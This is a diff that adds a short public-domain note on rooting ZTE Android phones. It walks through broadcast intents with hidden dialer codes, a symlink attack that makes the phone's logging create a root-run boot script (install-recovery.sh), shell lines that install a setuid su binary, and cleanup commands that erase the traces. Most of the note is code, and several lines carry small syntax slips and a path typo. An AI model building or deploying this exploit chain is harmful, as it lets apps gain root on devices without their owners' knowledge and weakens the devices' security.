@@ -1,0 +1,38 @@
+No license is applied to this code, it is public domain. Some tweaking maybe needed to make it 100% working
+
+This was tested ZTE avail, but is likely working on most ZTEs. You will need to take this, and make a working APK out of it.
+
+
+To create logs in /data/local/logs and cause system to be r/w on boot use this intent
+
+	sendBroadcast(new Intent("android.intent.action.emdoe").putExtra("com.zte.smartdialer.input", "*983*7668#"));
+
+To make the phone reboot
+
+	sendBroadcast(new Intent("android.intent.action.emdoe").putExtra("com.zte.smartdialer.input", "*983*27274#"));
+
+To create /system/ect/install-recovery.sh, which is ran on boot as root
+
+	shell("rm -r /data/local/logs/logcat/*");
+	shell("ln -s /system/etc/install-recovery.sh /data/local/logs/logcat/ps.txt"); //ps.txt might not be the best choice for this
+
+Reboot again
+
+	sendBroadcast(new Intent("android.intent.action.emdoe").putExtra("com.zte.smartdialer.input", "*983*27274#));
+
+Write custom script to install-recovery.sh, probably best to install/chown/chmod su
+
+	shell("echo '#!/system/bin/sh' > /system/etc/install-recovery.sh");
+	shell("echo 'cat /data/local/su > /system/xbin/su' >> /system/etc/install-recovery.sh");
+	shell("echo 'chown 0.0 /system/xbin/su' >> /system/etc/install-recovery.sh");
+	shell("echo 'chmod 06744 /system/xbin/su' >> /system/etc/install-recovery.sh");
+
+Reboot
+	sendBroadcast(new Intent("android.intent.action.emdoe").putExtra("com.zte.smartdialer.input", "*983*27274#));
+
+Clean up
+
+	rootshell("rm -r /data/local/logs");
+	rootshell("rm /data/property/persist.sys.ztelog.enable");
+	rootshell("rm -r /data/local/rwsystag");
+	sendBroadcast(new Intent("android.intent.action.emdoe").putExtra("com.zte.smartdialer.input", "*983*27274#));
